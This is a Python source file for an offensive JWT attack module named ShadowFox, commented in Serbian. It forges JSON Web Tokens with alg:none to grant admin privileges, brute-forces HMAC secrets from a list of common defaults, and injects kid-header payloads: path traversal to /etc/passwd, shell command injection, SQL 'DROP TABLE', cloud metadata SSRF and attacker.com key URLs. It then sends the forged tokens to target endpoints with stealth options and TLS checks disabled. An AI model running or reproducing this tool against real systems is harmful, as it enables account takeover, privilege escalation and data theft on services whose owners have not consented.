#!/usr/bin/env python3
"""
🦊 SHADOWFOX JWT MANIPULATION ATTACK MODULE
Specijalizovani modul za JWT napade - preuzimanje naloga kroz manipulaciju potpisa
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import base64
import hmac
import hashlib
import time
import random
import itertools
from urllib.parse import urlparse
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class JWTAttackFuzz:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "jwt_tokens_found": [],
            "alg_none_attacks": [],
            "hs256_bruteforce_attacks": [],
            "kid_injection_attacks": [],
            "successful_attacks": [],
            "statistics": {},
            "attack_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # JWT Attack payloads
        self.default_secrets = [
            "admin", "1234", "secret", "password", "123456", "admin123",
            "root", "test", "default", "key", "jwt", "token", "s3cr3t",
            "admin@123", "qwerty", "password123", "letmein", "welcome",
            "changeme", "administrator", "pass", "login", "user",
            "guest", "demo", "example", "sample", "dev", "development"
        ]
        
        self.kid_injection_payloads = [
            # Path traversal
            "../../../dev/null",
            "../../../../etc/passwd",
            "../../../proc/version",
            
            # Command injection
            "; cat /etc/passwd #",
            "| whoami #",
            "; id #",
            "`whoami`",
            "$(whoami)",
            
            # SQL injection
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            
            # NoSQL injection
            "'; return true; //",
            "'; return 1==1; //",
            
            # XXE/SSRF
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "ftp://attacker.com/",
            
            # Remote file inclusion
            "http://attacker.com/malicious.key",
            "https://raw.githubusercontent.com/attacker/keys/main/jwt.key"
        ]
        
    def load_configs(self):
        """Učitava Meta config i Recon podatke"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
                
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                print(f"🔍 [RECON] Učitano {len(self.recon_data.get('discovered_endpoints', []))} endpoint-a")
                
        except FileNotFoundError as e:
            print(f"❌ [CONFIG ERROR] {str(e)}")
            print("🔧 [FIX] Pokretaj nakon ShadowRecon modula")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija sesije na osnovu Meta config"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
        else:
            time.sleep(random.uniform(0.1, 0.5))
            
    def extract_jwt_tokens(self):
        """Izvlačenje JWT token-a iz recon podataka"""
        print("🔍 [JWT] Traženje JWT token-a...")
        
        jwt_sources = []
        
        # Pretraži kroz endpoint-e
        for endpoint in self.recon_data.get('discovered_endpoints', []):
            url = endpoint.get('url', '')
            headers = endpoint.get('response_headers', {})
            
            # Traži JWT u header-ima
            for header_name, header_value in headers.items():
                if self.is_jwt_token(header_value):
                    jwt_sources.append({
                        "source": "response_header",
                        "header_name": header_name,
                        "url": url,
                        "token": header_value
                    })
                    
        # Pretraži kroz forme za JWT token-e
        for form in self.recon_data.get('forms_found', []):
            for input_field in form.get('inputs', []):
                value = input_field.get('value', '')
                if self.is_jwt_token(value):
                    jwt_sources.append({
                        "source": "form_input",
                        "form_url": form.get('url', ''),
                        "input_name": input_field.get('name', ''),
                        "token": value
                    })
                    
        # Pokušaj da pronađe JWT kroz test zahteve
        target_root = self.meta_config.get('target_root', '')
        if target_root:
            test_endpoints = [
                '/login', '/auth', '/api/login', '/api/auth',
                '/user/login', '/admin/login', '/signin', '/authenticate'
            ]
            
            for endpoint in test_endpoints:
                test_url = target_root.rstrip('/') + endpoint
                jwt_token = self.probe_for_jwt(test_url)
                if jwt_token:
                    jwt_sources.append({
                        "source": "probe_request",
                        "url": test_url,
                        "token": jwt_token
                    })
                    
        self.results["jwt_tokens_found"] = jwt_sources
        print(f"🎯 [JWT] Pronađeno {len(jwt_sources)} JWT token-a")
        
        return jwt_sources
        
    def is_jwt_token(self, token_string):
        """Provera da li je string JSON Web Token"""
        if not isinstance(token_string, str):
            return False
            
        # JWT ima 3 dela odvojena tačkama
        parts = token_string.split('.')
        if len(parts) != 3:
            return False
            
        try:
            # Dekodiramo header
            header = self.base64_url_decode(parts[0])
            header_json = json.loads(header)
            
            # Proveravamo da li ima 'alg' polje
            return 'alg' in header_json
        except:
            return False
            
    def base64_url_decode(self, data):
        """Base64 URL dekodiranje"""
        # Dodaj padding ako je potreban
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode('utf-8')
        
    def base64_url_encode(self, data):
        """Base64 URL kodiranje"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
        
    def probe_for_jwt(self, url):
        """Probaj da pronađeš JWT token na endpoint-u"""
        try:
            self.intelligent_delay()
            
            # Test sa osnovnim credentials
            test_credentials = [
                {"username": "admin", "password": "admin"},
                {"username": "test", "password": "test"},
                {"email": "admin@test.com", "password": "admin"},
                {"user": "admin", "pass": "1234"}
            ]
            
            for creds in test_credentials:
                response = self.session.post(url, data=creds)
                
                # Traži JWT u response header-ima
                for header_name, header_value in response.headers.items():
                    if self.is_jwt_token(header_value):
                        return header_value
                        
                # Traži JWT u response body
                try:
                    response_json = response.json()
                    for key, value in response_json.items():
                        if isinstance(value, str) and self.is_jwt_token(value):
                            return value
                except:
                    pass
                    
        except Exception as e:
            print(f"⚠️  [PROBE] {url}: {str(e)}")
            
        return None
        
    def attack_alg_none(self, jwt_token):
        """Napad: alg: none - uklanjanje potpisa"""
        print("🎯 [ATTACK] Algorithm None manipulation...")
        
        attacks = []
        parts = jwt_token.split('.')
        
        try:
            # Dekodiramo header i payload
            header = json.loads(self.base64_url_decode(parts[0]))
            payload = json.loads(self.base64_url_decode(parts[1]))
            
            # Varijante alg: none napada
            alg_none_variants = [
                "none",
                "None", 
                "NONE",
                "nOnE",
                "null",
                "",
                " none",
                "none "
            ]
            
            for alg_variant in alg_none_variants:
                # Modifikuj header
                modified_header = header.copy()
                modified_header["alg"] = alg_variant
                
                # Kreiraj maliciozne payload-e
                malicious_payloads = [
                    # Admin privilege escalation
                    {**payload, "role": "admin"},
                    {**payload, "admin": True},
                    {**payload, "is_admin": True},
                    {**payload, "user_role": "administrator"},
                    {**payload, "permissions": ["admin", "read", "write", "delete"]},
                    
                    # User substitution
                    {**payload, "sub": "admin"},
                    {**payload, "username": "admin"},
                    {**payload, "user": "administrator"},
                    {**payload, "email": "admin@company.com"},
                    
                    # ID manipulation
                    {**payload, "user_id": 1},
                    {**payload, "id": 0},
                    {**payload, "uid": "1"},
                ]
                
                for malicious_payload in malicious_payloads:
                    # Enkodiramo modifikovane delove
                    new_header = self.base64_url_encode(json.dumps(modified_header, separators=(',', ':')))
                    new_payload = self.base64_url_encode(json.dumps(malicious_payload, separators=(',', ':')))
                    
                    # Kreiramo token bez potpisa ili sa praznim potpisom
                    tampered_tokens = [
                        f"{new_header}.{new_payload}.",
                        f"{new_header}.{new_payload}",
                        f"{new_header}.{new_payload}.fake_signature"
                    ]
                    
                    for tampered_token in tampered_tokens:
                        attack_info = {
                            "attack_type": "alg_none",
                            "original_alg": header.get("alg", "unknown"),
                            "modified_alg": alg_variant,
                            "original_payload": payload,
                            "modified_payload": malicious_payload,
                            "tampered_token": tampered_token,
                            "attack_description": f"Algorithm set to '{alg_variant}' with admin privileges"
                        }
                        attacks.append(attack_info)
                        
        except Exception as e:
            print(f"❌ [ALG NONE ERROR] {str(e)}")
            
        self.results["alg_none_attacks"] = attacks
        print(f"🔥 [ALG NONE] Generisano {len(attacks)} napada")
        return attacks
        
    def attack_hs256_bruteforce(self, jwt_token):
        """Napad: HS256 brute force sa default ključevima"""
        print("🔨 [ATTACK] HS256 Secret bruteforce...")
        
        attacks = []
        parts = jwt_token.split('.')
        
        try:
            header = json.loads(self.base64_url_decode(parts[0]))
            payload = json.loads(self.base64_url_decode(parts[1]))
            
            # Proveri da li je HS256
            if header.get("alg") not in ["HS256", "HS384", "HS512"]:
                print("⚠️  [HS256] Token nije HMAC algoritam")
                return attacks
                
            algorithm = header.get("alg", "HS256")
            
            # Testiranje default secrets
            for secret in self.default_secrets:
                try:
                    # Kreiraj potpis sa testnim ključem
                    unsigned_token = f"{parts[0]}.{parts[1]}"
                    
                    if algorithm == "HS256":
                        hash_func = hashlib.sha256
                    elif algorithm == "HS384":
                        hash_func = hashlib.sha384
                    else:  # HS512
                        hash_func = hashlib.sha512
                        
                    signature = hmac.new(
                        secret.encode('utf-8'),
                        unsigned_token.encode('utf-8'),
                        hash_func
                    ).digest()
                    
                    expected_signature = self.base64_url_encode(signature)
                    
                    # Proveri da li se potpis poklapa
                    if expected_signature == parts[2]:
                        print(f"🎯 [CRACKED] Secret pronađen: '{secret}'")
                        
                        # Generiši maliciozne token-e sa pronađenim ključem
                        malicious_payloads = [
                            {**payload, "role": "admin"},
                            {**payload, "admin": True},
                            {**payload, "user": "admin"},
                            {**payload, "sub": "1"},
                            {**payload, "user_id": 1},
                            {**payload, "is_admin": True},
                            {**payload, "permissions": ["admin"]}
                        ]
                        
                        for mal_payload in malicious_payloads:
                            mal_payload_encoded = self.base64_url_encode(json.dumps(mal_payload, separators=(',', ':')))
                            mal_unsigned = f"{parts[0]}.{mal_payload_encoded}"
                            
                            mal_signature = hmac.new(
                                secret.encode('utf-8'),
                                mal_unsigned.encode('utf-8'),
                                hash_func
                            ).digest()
                            
                            mal_signature_encoded = self.base64_url_encode(mal_signature)
                            malicious_token = f"{mal_unsigned}.{mal_signature_encoded}"
                            
                            attack_info = {
                                "attack_type": "hs256_bruteforce",
                                "cracked_secret": secret,
                                "algorithm": algorithm,
                                "original_payload": payload,
                                "modified_payload": mal_payload,
                                "malicious_token": malicious_token,
                                "attack_description": f"JWT signed with cracked secret '{secret}'"
                            }
                            attacks.append(attack_info)
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"❌ [HS256 ERROR] {str(e)}")
            
        self.results["hs256_bruteforce_attacks"] = attacks
        print(f"🔥 [HS256] Generisano {len(attacks)} napada")
        return attacks
        
    def attack_kid_injection(self, jwt_token):
        """Napad: kid header injection"""
        print("💉 [ATTACK] KID Header injection...")
        
        attacks = []
        parts = jwt_token.split('.')
        
        try:
            header = json.loads(self.base64_url_decode(parts[0]))
            payload = json.loads(self.base64_url_decode(parts[1]))
            
            # Generiši napade sa kid injection
            for kid_payload in self.kid_injection_payloads:
                modified_header = header.copy()
                modified_header["kid"] = kid_payload
                
                # Dodaj dodatne maliciozne header parametre
                header_variations = [
                    {"kid": kid_payload},
                    {"kid": kid_payload, "jku": "http://attacker.com/keys.json"},
                    {"kid": kid_payload, "x5u": "http://attacker.com/cert.pem"},
                    {"kid": kid_payload, "x5c": ["malicious_cert"]},
                ]
                
                for header_variation in header_variations:
                    test_header = header.copy()
                    test_header.update(header_variation)
                    
                    # Malicious payloads
                    malicious_payloads = [
                        payload,  # Original payload
                        {**payload, "admin": True},
                        {**payload, "role": "admin"},
                        {**payload, "user": "admin"}
                    ]
                    
                    for mal_payload in malicious_payloads:
                        new_header = self.base64_url_encode(json.dumps(test_header, separators=(',', ':')))
                        new_payload = self.base64_url_encode(json.dumps(mal_payload, separators=(',', ':')))
                        
                        # Različite varijante potpisa
                        signature_variants = [
                            parts[2],  # Original signature
                            "",        # Empty signature
                            "fake",    # Fake signature
                            self.base64_url_encode("injected_signature")
                        ]
                        
                        for signature in signature_variants:
                            tampered_token = f"{new_header}.{new_payload}.{signature}"
                            
                            attack_info = {
                                "attack_type": "kid_injection",
                                "injection_payload": kid_payload,
                                "modified_header": test_header,
                                "modified_payload": mal_payload,
                                "tampered_token": tampered_token,
                                "attack_description": f"KID injection: {kid_payload[:50]}..."
                            }
                            attacks.append(attack_info)
                            
        except Exception as e:
            print(f"❌ [KID INJECTION ERROR] {str(e)}")
            
        self.results["kid_injection_attacks"] = attacks
        print(f"🔥 [KID INJECTION] Generisano {len(attacks)} napada")
        return attacks
        
    def test_jwt_attacks(self, attacks, original_token):
        """Testiranje JWT napada na endpoint-ima"""
        print("🧪 [TEST] Testiranje JWT napada...")
        
        successful_attacks = []
        target_root = self.meta_config.get('target_root', '')
        
        # Test endpoint-i za JWT validaciju
        test_endpoints = [
            '/api/user', '/api/profile', '/api/admin', '/user/profile',
            '/admin/dashboard', '/api/me', '/profile', '/dashboard',
            '/api/users', '/admin/users', '/user/settings'
        ]
        
        attack_count = 0
        total_attacks = len(attacks)
        
        for attack in attacks[:50]:  # Ograniči broj napada
            attack_count += 1
            print(f"🔥 [TEST] {attack_count}/{min(50, total_attacks)} - {attack['attack_type']}")
            
            tampered_token = attack.get('tampered_token') or attack.get('malicious_token', '')
            
            for endpoint in test_endpoints:
                test_url = target_root.rstrip('/') + endpoint
                
                # Test sa Authorization header
                test_headers = [
                    {"Authorization": f"Bearer {tampered_token}"},
                    {"Authorization": f"JWT {tampered_token}"},
                    {"Authorization": tampered_token},
                    {"X-Auth-Token": tampered_token},
                    {"X-JWT-Token": tampered_token}
                ]
                
                for header_set in test_headers:
                    try:
                        self.intelligent_delay()
                        
                        response = self.session.get(test_url, headers=header_set)
                        
                        # Analiza odgovora
                        is_successful = self.analyze_jwt_response(
                            response, original_token, tampered_token, test_url
                        )
                        
                        if is_successful:
                            success_info = {
                                **attack,
                                "test_url": test_url,
                                "test_headers": header_set,
                                "response_status": response.status_code,
                                "response_headers": dict(response.headers),
                                "response_body": response.text[:1000],
                                "confirmed": True
                            }
                            successful_attacks.append(success_info)
                            print(f"✅ [SUCCESS] {attack['attack_type']} na {test_url}")
                            
                    except Exception as e:
                        continue
                        
        self.results["successful_attacks"] = successful_attacks
        print(f"🎯 [RESULTS] {len(successful_attacks)} uspešnih napada")
        return successful_attacks
        
    def analyze_jwt_response(self, response, original_token, tampered_token, url):
        """Analiza da li je JWT napad uspešan"""
        # Različiti indikatori uspešnog napada
        success_indicators = [
            # Status codes
            response.status_code == 200,
            response.status_code == 201,
            
            # Response body indicators
            "admin" in response.text.lower(),
            "administrator" in response.text.lower(),
            "success" in response.text.lower(),
            "welcome" in response.text.lower(),
            "dashboard" in response.text.lower(),
            "profile" in response.text.lower(),
            
            # JSON response indicators
            self.check_json_success(response)
        ]
        
        # Ako je makar jedan indikator pozitivan
        return any(success_indicators)
        
    def check_json_success(self, response):
        """Provera JSON odgovora za indikatore uspešnog napada"""
        try:
            json_data = response.json()
            
            success_fields = [
                json_data.get("success", False),
                json_data.get("authenticated", False),
                json_data.get("admin", False),
                json_data.get("is_admin", False),
                "admin" in str(json_data.get("role", "")).lower(),
                "admin" in str(json_data.get("user_type", "")).lower()
            ]
            
            return any(success_fields)
        except:
            return False
            
    def generate_statistics(self):
        """Generisanje statistike JWT napada"""
        stats = {
            "total_jwt_tokens": len(self.results["jwt_tokens_found"]),
            "alg_none_attacks": len(self.results["alg_none_attacks"]),
            "hs256_attacks": len(self.results["hs256_bruteforce_attacks"]),
            "kid_injection_attacks": len(self.results["kid_injection_attacks"]),
            "successful_attacks": len(self.results["successful_attacks"]),
            "attack_timestamp": self.results["attack_timestamp"],
            "success_rate": 0
        }
        
        total_attacks = stats["alg_none_attacks"] + stats["hs256_attacks"] + stats["kid_injection_attacks"]
        if total_attacks > 0:
            stats["success_rate"] = (stats["successful_attacks"] / total_attacks) * 100
            
        self.results["statistics"] = stats
        
    def save_results(self):
        """Snimanje rezultata u attack_jwt_fuzz.json"""
        output_file = "Napad/attack_jwt_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def run_jwt_attacks(self):
        """Glavna JWT attack operacija"""
        print("🦊 SHADOWFOX JWT ATTACKS - POKRETANJE")
        print("=" * 50)
        
        # 1. Učitaj konfiguracije
        self.load_configs()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Izvuci JWT token-e
        jwt_sources = self.extract_jwt_tokens()
        
        if not jwt_sources:
            print("❌ [ERROR] Nisu pronađeni JWT token-i")
            return
            
        # 4. Pokreni napade za svaki JWT token
        all_attacks = []
        
        for jwt_source in jwt_sources[:3]:  # Ograniči na 3 token-a
            jwt_token = jwt_source["token"]
            print(f"\n🎯 [TARGET] JWT iz: {jwt_source['source']}")
            
            # alg: none napadi
            alg_attacks = self.attack_alg_none(jwt_token)
            all_attacks.extend(alg_attacks)
            
            # HS256 brute force
            hs256_attacks = self.attack_hs256_bruteforce(jwt_token)
            all_attacks.extend(hs256_attacks)
            
            # kid injection
            kid_attacks = self.attack_kid_injection(jwt_token)
            all_attacks.extend(kid_attacks)
            
            # Testiraj napade
            self.test_jwt_attacks(all_attacks, jwt_token)
            
        # 5. Generiši statistiku
        self.generate_statistics()
        
        # 6. Snimi rezultate
        self.save_results()
        
        # 7. Prikaži sažetak
        self.display_summary()
        
    def display_summary(self):
        """Prikaz sažetka JWT napada"""
        stats = self.results["statistics"]
        print("\n🎯 SHADOWFOX JWT ATTACKS - SAŽETAK")
        print("=" * 50)
        print(f"🔍 JWT token-i: {stats['total_jwt_tokens']}")
        print(f"🚫 alg:none napadi: {stats['alg_none_attacks']}")
        print(f"🔨 HS256 napadi: {stats['hs256_attacks']}")
        print(f"💉 kid injection: {stats['kid_injection_attacks']}")
        print(f"✅ Uspešni napadi: {stats['successful_attacks']}")
        print(f"📊 Uspešnost: {stats['success_rate']:.1f}%")
        
        if self.results["successful_attacks"]:
            print(f"\n🏆 USPEŠNI NAPADI:")
            for attack in self.results["successful_attacks"][:3]:
                print(f"   • {attack['attack_type']} na {attack.get('test_url', 'unknown')}")
                
        print(f"\n✅ Rezultati: Napad/attack_jwt_fuzz.json")

def main():
    jwt_attack = JWTAttackFuzz()
    jwt_attack.run_jwt_attacks()

if __name__ == "__main__":
    main()
